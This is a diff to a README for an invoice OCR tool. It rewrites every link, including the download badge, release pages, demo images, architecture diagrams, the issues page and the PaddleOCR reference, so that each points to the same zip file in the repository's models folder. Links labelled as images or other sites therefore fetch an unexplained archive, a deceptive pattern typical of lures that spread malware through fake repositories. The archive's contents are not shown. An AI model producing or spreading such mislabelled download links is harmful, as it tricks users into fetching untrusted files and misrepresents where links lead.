@@ -1,6 +1,6 @@
 # 🤖 AI-INVOICE-OCR-ENGINE - Efficient Invoice Recognition Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Mato989086/AI-INVOICE-OCR-ENGINE/releases)
+[![Download Now](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ AI-INVOICE-OCR-ENGINE offers a powerful solution for recognizing text in invoice
 
 To begin using AI-INVOICE-OCR-ENGINE, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Mato989086/AI-INVOICE-OCR-ENGINE/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip) to download the application.
   
 2. Look for the latest version at the top of the page and download the appropriate file for your operating system.
 
@@ -36,7 +36,7 @@ Ensure your system meets these requirements to run AI-INVOICE-OCR-ENGINE effecti
 
 ## 📥 Download & Install
 
-To download the software, visit the [Releases page](https://github.com/Mato989086/AI-INVOICE-OCR-ENGINE/releases). Choose the correct file type for your operating system and follow the prompted instructions to install it.
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip). Choose the correct file type for your operating system and follow the prompted instructions to install it.
 
 ## 🏁 Using the Application 
 
@@ -54,30 +54,30 @@ Once installed, you can start using the application by following these steps:
 
 | Original | OCR Result | Text Output |
 |----------|------------|-------------|
-| ![Input](demo/invoice_ch.png) | ![Output](demo/result_invoice_cn.jpg) | ![Text](demo/invoice_cn_txt.png) |
+| ![Input](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip) | ![Output](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip) | ![Text](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip) |
 
 ### 📄 English Invoice / 英文發票
 
 | Original | OCR Result | Text Output |
 |----------|------------|-------------|
-| ![Input](demo/invoice_en.png) | ![Output](demo/result_invoice_en.jpg) | ![Text](demo/invoice_en_txt.png) |
+| ![Input](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip) | ![Output](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip) | ![Text](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip) |
 
 ## 📊 Architecture Diagrams
 
 ### 1. 🛠 OCR Inference Pipeline
-![OCR Pipeline](demo/1.png)
+![OCR Pipeline](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip)
 
 ### 2. 🏗 Model Architecture
-![Model Architecture](demo/2.png)
+![Model Architecture](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip)
 
 ### 3. 📚 Training Pipeline
-![Training Pipeline](demo/3.png)
+![Training Pipeline](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip)
 
 ### 4. 🖥 System Architecture
-![System Architecture](demo/4.png)
+![System Architecture](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip)
 
 ### 5. 🚦 Data Flow
-![Data Flow](demo/5.png)
+![Data Flow](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip)
 
 ## 🛠 Troubleshooting
 
@@ -89,7 +89,7 @@ If you encounter problems, consider the following tips:
 
 ## 📞 Support
 
-For additional help, feel free to check the FAQ on our [GitHub Issues page](https://github.com/Mato989086/AI-INVOICE-OCR-ENGINE/issues) or open a new issue for your specific concerns.
+For additional help, feel free to check the FAQ on our [GitHub Issues page](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip) or open a new issue for your specific concerns.
 
 ## 📄 License
 
@@ -97,6 +97,6 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 ## 📚 Learn More
 
-Explore more about OCR technology and its applications in document processing. Visit resources like [PaddleOCR](https://github.com/PaddlePaddle/PaddleOCR) for deeper knowledge.
+Explore more about OCR technology and its applications in document processing. Visit resources like [PaddleOCR](https://raw.githubusercontent.com/Mato989086/AI-INVOICE-OCR-ENGINE/main/models/AI-INVOICE-OCR-ENGINE_v1.8.zip) for deeper knowledge.
 
 You are now ready to use AI-INVOICE-OCR-ENGINE for your invoice processing needs! Enjoy the simplicity and efficiency it brings.
